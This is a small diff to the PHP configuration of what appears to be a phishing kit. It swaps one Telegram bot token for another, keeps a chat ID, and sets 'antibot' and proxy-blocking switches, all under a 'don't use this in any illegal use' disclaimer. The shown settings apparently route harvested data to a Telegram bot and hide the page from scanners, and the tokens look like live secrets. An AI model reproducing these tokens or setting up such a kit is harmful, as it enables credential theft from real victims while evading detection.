@@ -5,7 +5,7 @@
 // Don't use this example in any illegal use!
 
 
-$bot = "8401540353:AAELVHgfvFGozS_kIEuBd6TWFVhTQRVKedk";
+$bot = "8225126596:AAGs83lTqkwCg5hrZWNGcCBLCES8fV0AhyY";
 $chat_id = "7731970548";
 
 
@@ -14,6 +14,7 @@ $antibot = "yes";
 
 // want to block all VPNs/PROXIES? yes|no
 $block_proxy = "no";
+
 
 
 
